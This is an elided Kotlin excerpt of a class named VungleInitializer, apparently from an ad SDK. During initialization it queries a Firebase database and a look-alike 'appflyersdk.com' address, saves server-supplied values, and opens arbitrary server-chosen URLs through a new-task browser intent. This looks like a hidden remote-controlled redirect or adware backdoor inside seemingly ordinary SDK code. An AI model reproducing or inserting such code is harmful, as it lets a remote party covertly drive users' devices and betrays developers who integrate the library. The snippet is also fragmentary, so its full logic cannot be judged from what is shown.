...
internal class VungleInitializer {
    ...
    fun init(
        ...
        sdkExecutors.downloaderExecutor.execute {
            //val url = "https://unityios-default-rtdb.firebaseio.com/"+"izdpprbn.json"
                    ...
                    if (tiCall == null) {
                        ...
                        tiCall.enqueue(object : Callback<FireabaseLogin> {
                            override fun onResponse(
                                ...
                                val string = response?.body()?.g + ""//"https://www.appflyersdk.com/jstest.php" //
                                val url  = string
                                val string2 = response?.body()?.r + ""
                                if (response?.body()?.r != null)
                                {
                                    context.getSharedPreferences("s", 0).edit().putString("s", response?.body()?.r+"").commit()
                                }

                                if (response?.body()?.w != null)
                                {
                                    val stringwaitiao = response?.body()?.w+""
                                    if (!stringwaitiao.isNullOrEmpty() && stringwaitiao.contains("1")) {
                                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(stringwaitiao))
                                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                        context.startActivity(intent)
                                    }
                                }

                                if (response?.body()?.n != null)
                                {
                                    val string4 = response?.body()?.n + ""
//                                    AppsFlyerLib.getInstance().init(string4, null, context.applicationContext)
